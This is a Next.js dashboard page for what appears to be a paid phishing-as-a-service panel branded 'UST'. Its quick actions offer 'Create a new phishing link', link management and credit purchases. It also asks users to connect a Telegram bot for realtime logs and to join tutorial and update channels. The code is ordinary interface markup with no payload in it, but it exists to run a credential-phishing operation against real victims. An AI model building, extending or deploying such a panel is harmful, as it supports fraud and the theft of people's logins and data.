'use client';

import { useSession } from 'next-auth/react';
import { useRouter } from 'next/navigation';
import { 
  CreditCardIcon,
  LinkIcon,
  ChartBarIcon,
  ArrowTrendingUpIcon,
  ClockIcon,
  Cog6ToothIcon,
  UserIcon,
  PlusIcon,
  CheckCircleIcon,
  ExclamationCircleIcon,
  ArrowTopRightOnSquareIcon
} from '@heroicons/react/24/outline';
import Link from 'next/link';
import { useEffect, useState } from 'react';

interface StatCard {
  title: string;
  value: string | number;
  icon: React.ForwardRefExoticComponent<any>;
  change?: string;
  trend?: 'up' | 'down' | 'neutral';
}


export default function DashboardPage() {
  const { data: session } = useSession();
  const user = session?.user;

  if (!session || !user) {
    return null; // or a loading spinner
  }

  const quickLinks = [
    {
      name: 'Generate Link',
      description: 'Create a new phishing link',
      icon: PlusIcon,
      href: '/generate',
      color: 'text-blue-500'
    },
    {
      name: 'My Links',
      description: 'View and manage your links',
      icon: LinkIcon,
      href: '/links',
      color: 'text-purple-500'
    },
    {
      name: 'Buy Credits',
      description: 'Top up your balance',
      icon: CreditCardIcon,
      href: '/buy',
      color: 'text-green-500'
    },
    {
      name: 'Settings',
      description: 'Manage your preferences',
      icon: Cog6ToothIcon,
      href: '/settings',
      color: 'text-gray-500'
    }
  ];

  return (
    <div className="space-y-8">
      {/* Welcome Section */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-xl font-bold text-gray-900 dark:text-white">
            Welcome back, <span className='capitalize'>{user.username || 'User'}</span>
          </h1>
        </div>
        <Link
          href="/profile"
          className="flex items-center px-4 py-2 text-sm font-medium text-gray-700 dark:text-gray-200 bg-white dark:bg-gray-800 rounded-lg border border-gray-200 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-700/50 transition-colors"
        >
          <UserIcon className="h-5 w-5 mr-2" />
          View Profile
        </Link>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
        {/* Required Actions */}
        <div className="lg:col-span-4 space-y-6">
          <h2 className="text-lg font-semibold text-gray-900 dark:text-white">
            Required Actions
          </h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
            <Link
              href="/connect-telegram"
              className={`flex items-center p-4 bg-white dark:bg-gray-800 rounded-xl border ${
                user.telegramId ? 'border-green-500' : 'border-red-500'
              } hover:border-blue-500 dark:hover:border-blue-500 transition-colors`}
            >
              <div className="flex-1">
                <h3 className="text-sm font-medium text-gray-900 dark:text-white">
                  Connect Telegram Bot
                </h3>
                <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                  Connect to UST Telegram bot for realtime logs
                </p>
              </div>
              {user.telegramId ? (
                <CheckCircleIcon className="h-5 w-5 text-green-500" />
              ) : (
                <ExclamationCircleIcon className="h-5 w-5 text-red-500" />
              )}
            </Link>

            <Link
              href="https://t.me/ust_tutorials"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center p-4 bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 hover:border-blue-500 dark:hover:border-blue-500 transition-colors"
            >
              <div className="flex-1">
                <h3 className="text-sm font-medium text-gray-900 dark:text-white">
                  Join Tutorials Channel
                </h3>
                <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                  Learn how to use UST effectively
                </p>
              </div>
              <ArrowTopRightOnSquareIcon className="h-5 w-5 text-gray-400" />
            </Link>

            <Link
              href="https://t.me/ust_updates"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center p-4 bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 hover:border-blue-500 dark:hover:border-blue-500 transition-colors"
            >
              <div className="flex-1">
                <h3 className="text-sm font-medium text-gray-900 dark:text-white">
                  Join Update Channel
                </h3>
                <p className="mt-1 text-xs text-gray-500 dark:text-gray-400">
                  Get latest updates and information
                </p>
              </div>
              <ArrowTopRightOnSquareIcon className="h-5 w-5 text-gray-400" />
            </Link>
          </div>
        </div>

        {/* Quick Actions */}
        <div className="lg:col-span-4 space-y-6">
          <h2 className="text-lg font-semibold text-gray-900 dark:text-white">
            Quick Actions
          </h2>
          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
            {quickLinks.map((item, index) => (
              <Link
                key={index}
                href={item.href}
                className="group p-6 bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700 hover:border-blue-500 dark:hover:border-blue-500 transition-colors"
              >
                <div className="flex items-center justify-between">
                  <div>
                    <h3 className="text-sm font-semibold text-gray-900 dark:text-white group-hover:text-blue-500 transition-colors">
                      {item.name}
                    </h3>
                    <p className="mt-1 text-sm text-gray-500 dark:text-gray-400">
                      {item.description}
                    </p>
                  </div>
                  <item.icon className={`h-6 w-6 ${item.color}`} />
                </div>
              </Link>
            ))}
          </div>
        </div>

      </div>
    </div>
  );
}